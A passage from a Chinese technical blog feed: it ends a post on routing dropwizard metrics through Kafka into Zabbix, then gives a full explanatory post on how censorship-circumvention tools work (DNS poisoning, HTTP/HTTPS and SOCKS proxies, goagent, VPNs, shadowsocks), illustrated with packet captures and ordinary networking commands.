<p>Java程序先把metrics数据上报到kafka，然后kafka consumer从metrics数据里，提取出host, key信息，再用zabbix-api在zabbix server上创建item，最后把metrics数据上报给zabbix server。</p>
<p>自动创建的zabbix item的效果图：<br><img src="/img/zabbix-api-create-zabbix-item.png" alt="zabbix-api-create-zabbix-item"></p>
<p>在zabbix上显示的用户自定义的统计数据的图：<br><img src="/img/zabbix-test-response-size.png" alt="zabbix-test-response-size"></p>
<h2 id="数据的聚合"><a href="#数据的聚合" class="headerlink" title="数据的聚合"></a>数据的聚合</h2><p>比如，统计接口的访问次数，而这个接口部署在多台服务器上，那么如何展示聚合的数据？</p>
<p>zabbix自带有聚合功能，参考：</p>
<p><a href="http://opsnotes.net/2014/10/24/zabbix_juhe/" target="_blank" rel="noopener">http://opsnotes.net/2014/10/24/zabbix_juhe/</a>  实战：Zabbix 聚合功能配置与应用</p>
<h2 id="metrics的实现的探讨"><a href="#metrics的实现的探讨" class="headerlink" title="metrics的实现的探讨"></a>metrics的实现的探讨</h2><p>从dropwizard/metrics里，我们可以看到一种简单直观的实现：</p>
<ul>
<li>app内收集统计数据，计算好具体的key/value</li>
<li>定时上报</li>
</ul>
<p>另外，用分布式调用追踪（dapper/zipkin）的办法，也可以实现部分metrics的功能。<br>比如某个方法的调用次数，缓存命中次数等。</p>
<p>当然，两者只是部分功能有重合。</p>
<p>dropwizard/metrics 是一种轻量级的手段，用户可以随意增加自己想要的统计数据，代码也很灵活。有些简单直观的统计数据如果用分布式调用追踪的方式来做，显然会比较吃力，得不偿失。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本文提出并实现了，利用dropwizard/metrics做数据统计，kafka做数据传输，zabbix做数据展示的完整流程。</p>
<p>对于开发者来说，不需要关心具体的实现，只需要按dropwizard/metrics的文档做统计，再配置上metrics-kafka reporter即可。</p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>metrics</tag>
        <tag>zabbix</tag>
        <tag>kafka</tag>
      </tags>
  </entry>
  <entry>
    <title>科学上网的一些原理</title>
    <url>/something-about-science-surf-the-internet/</url>
    <content><![CDATA[<h2 id="知其所以然"><a href="#知其所以然" class="headerlink" title="知其所以然"></a>知其所以然</h2><p>本文不是教程向，倾向于分析科学上网的一些原理。知其所以然，才能更好地使用工具，也可以创作出自己的工具。</p>
<p>科学上网的工具很多，八仙过海，各显神通，而且综合了各种技术。尝试从以下四个方面来解析一些其中的原理。大致先原理，再工具的顺序。</p>
<ul>
<li>dns</li>
<li>http/https proxy</li>
<li>vpn</li>
<li>socks proxy</li>
</ul>
<h2 id="一个http请求发生了什么？"><a href="#一个http请求发生了什么？" class="headerlink" title="一个http请求发生了什么？"></a>一个http请求发生了什么？</h2><p>这个是个比较流行的面试题，从中可以引出很多的内容。大致分为下面四个步骤：</p>
<ul>
<li>dns解析，得到IP</li>
<li>向目标IP发起TCP请求</li>
<li>发送http request</li>
<li>服务器回应，浏览器解析</li>
</ul>
<p>还有很多细节，更多参考：</p>
<p><a href="http://fex.baidu.com/blog/2014/05/what-happen/" target="_blank" rel="noopener">http://fex.baidu.com/blog/2014/05/what-happen/</a></p>
<p><a href="http://stackoverflow.com/questions/2092527/what-happens-when-you-type-in-a-url-in-browser" target="_blank" rel="noopener">http://stackoverflow.com/questions/2092527/what-happens-when-you-type-in-a-url-in-browser</a></p>
<p><a href="http://div.io/topic/609?page=1" target="_blank" rel="noopener">http://div.io/topic/609?page=1</a>  从FE的角度上再看输入url后都发生了什么</p>
<h2 id="DNS-域名解析"><a href="#DNS-域名解析" class="headerlink" title="DNS/域名解析"></a>DNS/域名解析</h2><p>可以看到dns解析是最初的一步，也是最重要的一步。比如访问亲友，要知道他的正确的住址，才能正确地上门拜访。</p>
<p>dns有两种协议，一种是UDP（默认），一种是TCP。</p>
<h3 id="udp-方式，先回应的数据包被当做有效数据"><a href="#udp-方式，先回应的数据包被当做有效数据" class="headerlink" title="udp 方式，先回应的数据包被当做有效数据"></a>udp 方式，先回应的数据包被当做有效数据</h3><p>在linux下可以用dig来检测dns。国内的DNS服务器通常不会返回正常的结果。<br>下面以google的8.8.8.8 dns服务器来做测试，并用wireshark来抓包，分析结果。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @8.8.8.8  www.youtube.com</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dns-udp-youtube-badresponse-fast.png" alt="dns-udp-youtube"></p>
<p>从wireshark的结果，可以看到返回了三个结果，<strong>前面两个是错误的，后面的是正确的</strong>。</p>
<p>但是，对于dns客户端来说，它只会取最快回应的的结果，后面的正确结果被丢弃掉了。<strong>因为中间被插入了污染包，所以即使我们配置了正确的dns服务器，也解析不到正确的IP。</strong></p>
<h3 id="tcp-方式，有时有效，可能被rest"><a href="#tcp-方式，有时有效，可能被rest" class="headerlink" title="tcp 方式，有时有效，可能被rest"></a>tcp 方式，有时有效，可能被rest</h3><p>再用TCP下的DNS来测试下:<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @8.8.8.8 +tcp   www.youtube.com</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/dns-tcp-youtube-reset.png" alt="dns-tcp-youtube-reset"></p>
<p>从wireshark的结果，可以看出在TCP三次握手成功时，本地发出了一个查询<a href="http://www.youtube.com的dns请求，结果，很快收到了一个RST回应。而RST回应是在TCP连接断开时，才会发出的。所以可以看出，**TCP通讯受到了干扰，DNS客户端因为收到RST回应，认为对方断开了连接，因此也无法收到后面正确的回应数据包了。*" target="_blank" rel="noopener">www.youtube.com的dns请求，结果，很快收到了一个RST回应。而RST回应是在TCP连接断开时，才会发出的。所以可以看出，**TCP通讯受到了干扰，DNS客户端因为收到RST回应，认为对方断开了连接，因此也无法收到后面正确的回应数据包了。*</a>*</p>
<p>再来看下解析twitter的结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dig @8.8.8.8 +tcp  www.twitter.com</span><br></pre></td></tr></table></figure></p>
<p>结果：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www.twitter.com.        590     IN      CNAME   twitter.com.</span><br><span class="line">twitter.com.            20      IN      A       199.59.150.7 80</span><br><span class="line">twitter.com.            20      IN      A       199.59.150.7</span><br><span class="line">twitter.com.            20      IN      A       199.59.149.230</span><br><span class="line">twitter.com.            20      IN      A       199.59.150.39</span><br></pre></td></tr></table></figure></p>
<p>这次返回的IP是正确的。但是尝试用telnet 去连接时，会发现连接不上。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 199.59.150.7 80</span><br></pre></td></tr></table></figure></p>
<p>但是，在国外服务器去连接时，可以正常连接，完成一个http请求。<strong>可见一些IP的访问被禁止了</strong>。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ telnet 199.59.150.7 80</span><br><span class="line">Trying 199.59.150.7...</span><br><span class="line">Connected to 199.59.150.7.</span><br><span class="line">Escape character is &apos;^]&apos;.</span><br><span class="line">GET / HTTP/1.0</span><br><span class="line">HOST:www.twitter.com</span><br><span class="line"></span><br><span class="line">HTTP/1.0 301 Moved Permanently</span><br><span class="line">content-length: 0</span><br><span class="line">date: Sun, 08 Feb 2015 06:28:08 UTC</span><br><span class="line">location: https://www.twitter.com/</span><br><span class="line">server: tsa_a</span><br><span class="line">set-cookie: guest_id=v1%3A142337688883648506; Domain=.twitter.com; Path=/; Expires=Tue, 07-Feb-2017 06:28:08 UTC</span><br><span class="line">x-connection-hash: 0f5eab0ea2d6309109f15447e1da6b13</span><br><span class="line">x-response-time: 2</span><br></pre></td></tr></table></figure></p>
<h3 id="黑名单-白名单"><a href="#黑名单-白名单" class="headerlink" title="黑名单/白名单"></a>黑名单/白名单</h3><p>想要获取到正确的IP，自然的黑名单/白名单两种思路。</p>
<p>下面列出一些相关的项目：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://github.com/holmium/dnsforwarder</span><br><span class="line">https://code.google.com/p/huhamhire-hosts/</span><br><span class="line">https://github.com/felixonmars/dnsmasq-china-list</span><br></pre></td></tr></table></figure></p>
<h3 id="本地DNS软件"><a href="#本地DNS软件" class="headerlink" title="本地DNS软件"></a>本地DNS软件</h3><ul>
<li>修改hosts文件<br>相信大家都很熟悉，也有一些工具可以自动更新hosts文件的。</li>
<li>浏览器pac文件<br>主流浏览器或者其插件，都可以配置pac文件。pac文件实际上是一个JS文件，可以通过编程的方式来控制dns解析结果。其效果类似hosts文件，不过pac文件通常都是由插件控制自动更新的。只能控制浏览器的dns解析。</li>
<li>本地dns服务器，dnsmasq<br>在linux下，可以自己配置一个dnsmasq服务器，然后自己管理dns。不过比较高级，也比较麻烦。</li>
</ul>
<p>顺便提一下，实际上，kubuntu的NetworkManager会自己启动一个私有的dnsmasq进程来做dns解析。不过它侦听的是127.0.1.1，所以并不会造成冲突。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/sbin/dnsmasq --no-resolv --keep-in-foreground --no-hosts --bind-interfaces --pid-file=/run/sendsigs.omit.d/network-manager.dnsmasq.pid --listen-address=127.0.1.1 --conf-file=/var/run/NetworkManager/dnsmasq.conf</span><br></pre></td></tr></table></figure></p>
<h3 id="路由器智能DNS"><a href="#路由器智能DNS" class="headerlink" title="路由器智能DNS"></a>路由器智能DNS</h3><p>基于OpenWRT/Tomoto的路由器可以在上面配置dns server，从而实现在路由器级别智能dns解析。现在国内的一些路由器是基于OpenWRT的，因此支持配置dns服务器。<br>参考项目：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https://github.com/clowwindy/ChinaDNS</span><br></pre></td></tr></table></figure></p>
<h2 id="http-proxy"><a href="#http-proxy" class="headerlink" title="http proxy"></a>http proxy</h2><h3 id="http-proxy请求和没有proxy的请求的区别"><a href="#http-proxy请求和没有proxy的请求的区别" class="headerlink" title="http proxy请求和没有proxy的请求的区别"></a>http proxy请求和没有proxy的请求的区别</h3><p>在chrome里没有设置http proxy的请求头信息是这样的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET /nocache/fesplg/s.gif</span><br><span class="line">Host: www.baidu.com</span><br></pre></td></tr></table></figure></p>
<p>在设置了http proxy之后，发送的请求头是这样的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET http://www.baidu.com//nocache/fesplg/s.gif</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">Proxy-Connection: keep-alive</span><br></pre></td></tr></table></figure></p>
<p>区别是配置http proxy之后，会在请求里发送完整的url。</p>
<p>client在发送请求时，如果没有proxy，则直接发送path，如果有proxy，则要发送完整的url。</p>
<p>实际上http proxy server可以处理两种情况，即使客户端没有发送完整的url，因为host字段里，已经有host信息了。</p>
<p>为什么请求里要有完整的url？</p>
<p>历史原因。</p>
<h3 id="目标服务器能否感知到http-proxy的存在？"><a href="#目标服务器能否感知到http-proxy的存在？" class="headerlink" title="目标服务器能否感知到http proxy的存在？"></a>目标服务器能否感知到http proxy的存在？</h3><p>当我们使用http proxy时，有个问题可能会关心的：目标服务器能否感知到http proxy的存在？</p>
<p>一个配置了proxy的浏览器请求头：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET http://55.75.138.79:9999/ HTTP/1.1</span><br><span class="line">Host: 55.75.138.79:9999</span><br><span class="line">Proxy-Connection: keep-alive</span><br></pre></td></tr></table></figure></p>
<p>实际上目标服务器接收到的信息是这样子的：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: 55.75.138.79:9999</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure></p>
<p>可见，http proxy服务器并没有把proxy相关信息发送到目标服务器上。</p>
<p>因此，目标服务器是没有办法知道用户是否使用了http proxy。</p>
<h3 id="http-proxy-keep-alive"><a href="#http-proxy-keep-alive" class="headerlink" title="http proxy keep-alive"></a>http proxy keep-alive</h3><p>实际上Proxy-Connection: keep-alive这个请求头是错误的，不在标准里：</p>
<p>因为http1.1 默认就是Connection: keep-alive</p>
<p>如果client想要http proxy在请求之后关闭connection，可以用Proxy-Connection: close 来指明。</p>
<p><a href="http://homepage.ntlworld.com/jonathan.deboynepollard/FGA/web-proxy-connection-header.html" target="_blank" rel="noopener">http://homepage.ntlworld.com/jonathan.deboynepollard/FGA/web-proxy-connection-header.html</a></p>
<h3 id="http-proxy-authentication"><a href="#http-proxy-authentication" class="headerlink" title="http proxy authentication"></a>http proxy authentication</h3><p>当http proxy需要密码时：</p>
<p>第一次请求没有密码，则会回应<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 407 Proxy authentication required</span><br><span class="line">Proxy-Authenticate: Basic realm=&quot;Polipo&quot;</span><br></pre></td></tr></table></figure></p>
<p>浏览器会弹出窗口，要求输入密码。<br>如果密码错误的话，回应头是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">HTTP/1.1 407 Proxy authentication incorrect</span><br></pre></td></tr></table></figure></p>
<p>如果是配置了密码，发送的请求头则是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET http://www.baidu.com/ HTTP/1.1</span><br><span class="line">Host: www.baidu.com</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">Proxy-Authorization: Basic YWRtaW46YWRtaW4=</span><br></pre></td></tr></table></figure></p>
<p>Proxy-Authorization实际是Base64编码。<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">base64(&quot;admin:admin&quot;) == &quot;YWRtaW46YWRtaW4=&quot;</span><br></pre></td></tr></table></figure></p>
<h3 id="http-proxy对于不认识的header和方法的处理："><a href="#http-proxy对于不认识的header和方法的处理：" class="headerlink" title="http proxy对于不认识的header和方法的处理："></a>http proxy对于不认识的header和方法的处理：</h3><p>http proxy通常会尽量原样发送，因为很多程序都扩展了http method，如果不支持，很多程序都不能正常工作。</p>
<p>客户端用OPTIONS 请求可以探测服务器支持的方法。但是意义不大。</p>
<h2 id="https-proxy"><a href="#https-proxy" class="headerlink" title="https proxy"></a>https proxy</h2><p>当访问一个https网站时，<a href="https://github.com" target="_blank" rel="noopener">https://github.com</a></p>
<p>先发送connect method，如果支持，会返回200</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CONNECT github.com:443 HTTP/1.1</span><br><span class="line">Host: github.com</span><br><span class="line">Proxy-Connection: keep-alive</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br></pre></td></tr></table></figure>
<h3 id="http-tunnel"><a href="#http-tunnel" class="headerlink" title="http tunnel"></a>http tunnel</h3><p><a href="http://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_tunneling" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/HTTP_tunnel#HTTP_CONNECT_tunneling</a></p>
<p>通过connect method，http proxy server实际上充当tcp转发的中间人。<br>比如，用nc 通过http proxy来连42端口：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nc -x10.2.3.4:8080 -Xconnect host.example.com 42</span><br></pre></td></tr></table></figure></p>
<p>原理是利用CONNECT方法，让http proxy服务器充当中间人。</p>
<h3 id="https-proxy的安全性？"><a href="#https-proxy的安全性？" class="headerlink" title="https proxy的安全性？"></a>https proxy的安全性？</h3><p>proxy server可以拿到什么信息？</p>
<p>通过一个http proxy去访问支付宝是否安全？</p>
<ul>
<li>可以知道host，即要访问的是哪个网站</li>
<li>拿不到url信息</li>
<li>https协议保证不会泄露通信内容</li>
<li>TLS(Transport Layer Security)  在握手时，生成强度足够的随机数</li>
<li>TLS 每一个record都要有一个sequence number，每发一个增加一个，并且是不能翻转的。</li>
<li>TLS 保证不会出现重放攻击</li>
</ul>
<p>TLS的内容很多，这里说到关于安全的一些关键点。</p>
<p>注意事项：</p>
<ul>
<li>确保是https访问</li>
<li>确保访问网站的证书没有问题</li>
</ul>
<p>是否真的安全了？更强的攻击者！</p>
<p>流量劫持 —— 浮层登录框的隐患</p>
<p><a href="http://fex.baidu.com/blog/2014/06/danger-behind-popup-login-dialog/" target="_blank" rel="noopener">http://fex.baidu.com/blog/2014/06/danger-behind-popup-login-dialog/</a></p>
<p><strong>所以，尽量不要使用来路不明的http/https proxy，使用公开的wifi也要小心。</strong></p>
<h2 id="goagent工作原理"><a href="#goagent工作原理" class="headerlink" title="goagent工作原理"></a>goagent工作原理</h2><ul>
<li>local http/https proxy</li>
<li>伪造https证书，导入浏览器信任列表里</li>
<li>浏览器配置http/https proxy</li>
<li>解析出http/https request的内容。然后把这些请求内容打包，发给GAE服务器</li>
<li>与GAE通信通过http/https，内容用RC4算法加密</li>
<li>GAE服务器，再调用google提供的 urlfetch，来获得请求的回应，然后再把回应打包，返回给客户端。</li>
<li>客户端把回应传给浏览器</li>
<li>自带dns解析服务器</li>
<li>在local/certs/ 目录下可以找到缓存的伪造的证书</li>
</ul>
<p>fiddler抓取https数据包是同样原理。</p>
<p>goagent会为每一个https网站伪造一个证书，并缓存起来。比如下面这个github的证书：<br><img src="/img/goagent-github-cert.png" alt="goagent-github-cert.png"></p>
<p>goagent的代码在3.0之后，支持了很多其它功能，变得有点混乱了。</p>
<p>以3.2.0 版本为例：</p>
<p>主要的代码是在server/gae/gae.py 里。<br><a href="https://github.com/goagent/goagent/blob/v3.2.0/server/gae/gae.py#L107" target="_blank" rel="noopener">https://github.com/goagent/goagent/blob/v3.2.0/server/gae/gae.py#L107</a></p>
<p>一些代码实现的细节：</p>
<ul>
<li>支持最长的url是2083，因为gae sdk的限制。<br><a href="https://github.com/AppScale/gae_sdk/blob/master/google/appengine/api/taskqueue/taskqueue.py#L241" target="_blank" rel="noopener">https://github.com/AppScale/gae_sdk/blob/master/google/appengine/api/taskqueue/taskqueue.py#L241</a></li>
<li>如果回应的内容是/text, json, javascript，且 &gt; 512会用gzip来压缩</li>
<li>处理一些Content-Range 的回应内容。Content-Range 的代码虽然只有一点点，但是如果是不熟悉的话，要花上不少工夫。</li>
<li>goagent的生成证书的代码在 local/proxylib.py的这个函数里：</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">@staticmethod</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_get_cert</span><span class="params">(commonname, sans=<span class="params">()</span>)</span>:</span></span><br></pre></td></tr></table></figure>
<h3 id="为什么goagent可以看视频？"><a href="#为什么goagent可以看视频？" class="headerlink" title="为什么goagent可以看视频？"></a>为什么goagent可以看视频？</h3><p>因为很多网站都是http协议的。有少部分是rmtp协议的，也有是rmtp over http的。</p>
<p>在youku看视频的一个请求数据：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http://14.152.72.22/youku/65748B784A636820C5A81B41C7/030002090454919F64A167032DBBC7EE242548-46C9-EB9D-916D-D8BA8D5159D3.flv?&amp;start=158</span><br><span class="line">response：</span><br><span class="line">Connection:close</span><br><span class="line">Content-Length:7883513</span><br><span class="line">Content-Type:video/x-flv</span><br><span class="line">Date:Wed, 17 Dec 2014 17:55:24 GMT</span><br><span class="line">ETag:&quot;316284225&quot;</span><br><span class="line">Last-Modified:Wed, 17 Dec 2014 15:21:26 GMT</span><br><span class="line">Server:YOUKU.GZ</span><br></pre></td></tr></table></figure></p>
<p>可以看到，有ETag，有长度信息等。</p>
<h3 id="goagent缺点"><a href="#goagent缺点" class="headerlink" title="goagent缺点"></a>goagent缺点</h3><ul>
<li>只是http proxy，不能代理其它协议</li>
<li>google的IP经常失效</li>
<li>不支持websocket协议</li>
<li>配置复杂</li>
</ul>
<h2 id="vpn"><a href="#vpn" class="headerlink" title="vpn"></a>vpn</h2><h3 id="流行的vpn类型"><a href="#流行的vpn类型" class="headerlink" title="流行的vpn类型"></a>流行的vpn类型</h3><ul>
<li>PPTP，linux pptpd，安全性低，不能保证数据完整性或者来源，MPPE加密暴力破解</li>
<li>L2TP，linux xl2tpd，预共享密钥可以保证安全性</li>
<li>SSTP，基于HTTPS，微软提出。linux开源实现SoftEther VPN</li>
<li>OPENVPN，基于SSL，预共享密钥可以保证安全性</li>
<li>所谓的SSL VPN，各家厂商有自己的实现，没有统一的标准</li>
<li>新型的staless VPN，像sigmavpn/ShadowVPN等</li>
</ul>
<p>现状：</p>
<ul>
<li>PPTP/L2TP 可用，但可能会不管用</li>
<li>SoftEther VPN/OPENVPN 可能会导致服务器被封IP，连不上，慎用</li>
<li>ShadowVPN可用，sigmavpn没有测试</li>
</ul>
<p>猜测下为什么PPTP，L2TP这些方案容易被检测到？</p>
<p>可能是因为它们的协议都有明显的标头：</p>
<ul>
<li>转发的是ppp协议数据，握手有特征</li>
<li>PPTP协议有GRE标头和PPP标头</li>
<li>L2TP有L2TP标头和PPP标头</li>
<li>L2TP要用到IPsec</li>
</ul>
<p>参考：</p>
<p><a href="https://technet.microsoft.com/zh-cn/library/cc771298(v=ws.10).aspx" target="_blank" rel="noopener">https://technet.microsoft.com/zh-cn/library/cc771298(v=ws.10).aspx</a></p>
<h3 id="网页版的SSL-VPN"><a href="#网页版的SSL-VPN" class="headerlink" title="网页版的SSL VPN"></a>网页版的SSL VPN</h3><p>有些企业，或者学校里，会有这种VPN：</p>
<ul>
<li>网页登陆帐号</li>
<li>设置IE代理，为远程服务器地址</li>
<li>通过代理浏览内部网页</li>
</ul>
<p>这种SSL VPN原理很简单，就是一个登陆验证的http proxy，其实并不能算是VPN？</p>
<h3 id="新型的staless-vpnVPN，sigmavpn-ShadowVPN"><a href="#新型的staless-vpnVPN，sigmavpn-ShadowVPN" class="headerlink" title="新型的staless vpnVPN，sigmavpn/ShadowVPN"></a>新型的staless vpnVPN，sigmavpn/ShadowVPN</h3><p>这种新型VPN的原理是，利用虚拟的网络设备TUN和TAP，把请求数据先发给虚拟设备，然后把数据加密转发到远程服务器。（VPN都这原理？）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">you &lt;-&gt; local &lt;-&gt; protocol &lt;-&gt; remote &lt;-&gt; ...... &lt;-&gt; remote &lt;-&gt; protocol &lt;-&gt; local &lt;-&gt; peer</span><br></pre></td></tr></table></figure>
<p>这种新型VPN的特点是很轻量，没有传统VPN那么复杂的握手加密控制等，而向个人，而非企业。SigmaVPN号称只有几百行代码。</p>
<p>参考：</p>
<p><a href="http://zh.wikipedia.org/wiki/TUN%E4%B8%8ETAP" target="_blank" rel="noopener">http://zh.wikipedia.org/wiki/TUN%E4%B8%8ETAP</a></p>
<p><a href="https://code.google.com/p/sigmavpn/wiki/Introduction" target="_blank" rel="noopener">https://code.google.com/p/sigmavpn/wiki/Introduction</a></p>
<h3 id="ubuntu-pptp-vpn-server安装"><a href="#ubuntu-pptp-vpn-server安装" class="headerlink" title="ubuntu pptp vpn server安装"></a>ubuntu pptp vpn server安装</h3><p>ubuntu官方参考文档：<br><a href="https://help.ubuntu.com/community/PPTPServer" target="_blank" rel="noopener">https://help.ubuntu.com/community/PPTPServer</a></p>
<ul>
<li><p>vps 要开启ppp和nat网络转发的功能</p>
</li>
<li><p><strong>设置MTU，建议设置为1200以下</strong>，因为中间网络可能很复杂，MTU太大可能导致连接失败</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">iptables -A FORWARD -p tcp --syn -s 192.168.0.0/24 -j TCPMSS --set-mss 1200</span><br></pre></td></tr></table></figure>
</li>
</ul>
<h2 id="socks-proxy"><a href="#socks-proxy" class="headerlink" title="socks proxy"></a>socks proxy</h2><ul>
<li>rfc 文档： <a href="http://tools.ietf.org/html/rfc1928" target="_blank" rel="noopener">http://tools.ietf.org/html/rfc1928</a></li>
<li><p>wiki上的简介： <a href="http://en.wikipedia.org/wiki/SOCKS#SOCKS5" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/SOCKS#SOCKS5</a></p>
</li>
<li><p>socks4/socks4a 已经过时</p>
</li>
<li>socks5</li>
</ul>
<p>socks5支持udp，所以如果客户端把dns查询也走socks的话，那么就可以直接解决dns的问题了。</p>
<h3 id="socks-proxy-握手的过程"><a href="#socks-proxy-握手的过程" class="headerlink" title="socks proxy 握手的过程"></a>socks proxy 握手的过程</h3><p>socks5流程</p>
<ul>
<li>客户端查询服务器支持的认证方式</li>
<li>服务器回应支持的认证方式</li>
<li>客户端发送认证信息，服务器回应</li>
<li><p>如果通过，客户端直接发送TCP/UDP的原始数据，以后proxy只单纯转发数据流，不做任何处理了</p>
</li>
<li><p><strong>socks proxy 自身没有加密机制，简单的TCP/UDP forward</strong></p>
</li>
</ul>
<p>socks协议其实是相当简单的，用wireshark抓包，结合netty-codec-socks，很容易可以理解其工作过程。<br><a href="https://github.com/netty/netty/tree/master/codec-socks" target="_blank" rel="noopener">https://github.com/netty/netty/tree/master/codec-socks</a></p>
<h3 id="ssh-socks-proxy"><a href="#ssh-socks-proxy" class="headerlink" title="ssh socks proxy"></a>ssh socks proxy</h3><p>如果有一个外国的服务器，可以通过ssh连接登陆，那么可以很简单地搭建一个本地的socks5代理。</p>
<p>XShell可以通过“转移规则”来配置本地socks服务器，putty也有类似的配置：<br><img src="/img/xshell-sock5-proxy.png" alt="xshell-sock5-proxy.png"></p>
<p>linux下命令行启动一个本地sock5服务器：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh -D 1080 user@romoteHost</span><br></pre></td></tr></table></figure></p>
<p>ssh还有一些端口转发的技巧，这对于测试网络程序，绕过防火墙也是很有帮助的。</p>
<p>参考：<a href="http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/" target="_blank" rel="noopener">http://www.ibm.com/developerworks/cn/linux/l-cn-sshforward/</a></p>
<h3 id="shadowsocks的工作原理"><a href="#shadowsocks的工作原理" class="headerlink" title="shadowsocks的工作原理"></a>shadowsocks的工作原理</h3><p>shadowsocks是非常流行的一个代理工具，其原理非常简单。</p>
<ul>
<li>客户端服务器预共享密码</li>
<li>本地socks5 proxy server（有没有想起在学校时用的ccproxy？）</li>
<li>软件/浏览器配置本地socks代理</li>
<li>本地socks server把数据包装，AES256加密，发送到远程服务器</li>
<li>远程服务器解密，转发给对应的服务器</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app =&gt; local socks server(encrypt) =&gt; shadowsocks server(decrypt) =&gt; real host</span><br><span class="line"></span><br><span class="line">app &lt;= (decrypt) local socks server &lt;= (encrypt) shadowsocks server &lt;= real host</span><br></pre></td></tr></table></figure>
<p>其它的一些东东：</p>
<ul>
<li>一个端口一个密码，没有用户的概念</li>
<li>支持多个worker并发</li>
<li>协议简单，比socks协议还要简单，抽取了socks协议的部分</li>
</ul>
<h3 id="shadowsoks的优点"><a href="#shadowsoks的优点" class="headerlink" title="shadowsoks的优点"></a>shadowsoks的优点</h3><ul>
<li>中间没有任何握手的环节，直接是TCP数据流</li>
<li>速度快</li>
</ul>
<h3 id="shadowsocks的安全性"><a href="#shadowsocks的安全性" class="headerlink" title="shadowsocks的安全性"></a>shadowsocks的安全性</h3><ul>
<li>服务器可以解出所有的TCP/UDP数据</li>
<li>中间人攻击，重放攻击</li>
</ul>
<p>所以，<strong>对于第三方shadow socks服务器，要慎重使用。</strong></p>
<p>在使用shadowsocks的情况下，https通迅是安全的，但是仍然有危险，参见上面http proxy安全的内容。</p>
<h3 id="vpn和socks代理的区别"><a href="#vpn和socks代理的区别" class="headerlink" title="vpn和socks代理的区别"></a>vpn和socks代理的区别</h3><p>从原理上来说，socks代理会更快，因为转发的数据更少。</p>
<p>因为vpn转发的是ppp数据包，ppp协议是数据链路层(data link layer)的协议。socks转发的是TCP/UDP数据，是传输(transport)层。</p>
<p>VPN的优点是很容易配置成全局的，这对于很多不能配置代理的程序来说很方便。而配置全局的socks proxy比较麻烦，目前貌似还没有简单的方案。</p>
<h3 id="linux下一些软件配置代理的方法"><a href="#linux下一些软件配置代理的方法" class="headerlink" title="linux下一些软件配置代理的方法"></a>linux下一些软件配置代理的方法</h3><ul>
<li>bash/shell</li>
</ul>
<p>对于shell，最简单的办法是在命令的前面设置下http_porxy的环境变量。<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">http_proxy=http://127.0.0.1:8123 wget http://test.com</span><br></pre></td></tr></table></figure></p>
<p>推荐的做法是在~/.bashrc 文件里设置两个命令，开关http proxy：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">alias</span> proxyOn=<span class="string">'export https_proxy=http://127.0.0.1:8123 &amp;&amp; http_proxy=http://127.0.0.1:8123'</span></span><br><span class="line"><span class="built_in">alias</span> proxyOff=<span class="string">'unset https_proxy &amp;&amp; unset  http_proxy'</span></span><br></pre></td></tr></table></figure></p>
<p>注意，如果想sudo的情况下，http proxy仍然有效，要配置env_keep。</p>
<p>在/etc/sudoers.d/目录下增加一个env_keep的文件，内容是：<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Defaults env_keep += &quot; http_proxy https_proxy ftp_proxy &quot;</span><br></pre></td></tr></table></figure></p>
<p>参考：<br><a href="https://help.ubuntu.com/community/AptGet/Howto#Setting_up_apt-get_to_use_a_http-proxy" target="_blank" rel="noopener">https://help.ubuntu.com/community/AptGet/Howto#Setting_up_apt-get_to_use_a_http-proxy</a></p>
<ul>
<li>GUI软件</li>
</ul>
<p>现在大部分软件都可以设置代理。<br>gnome和kde都可以设置全局的代理。</p>
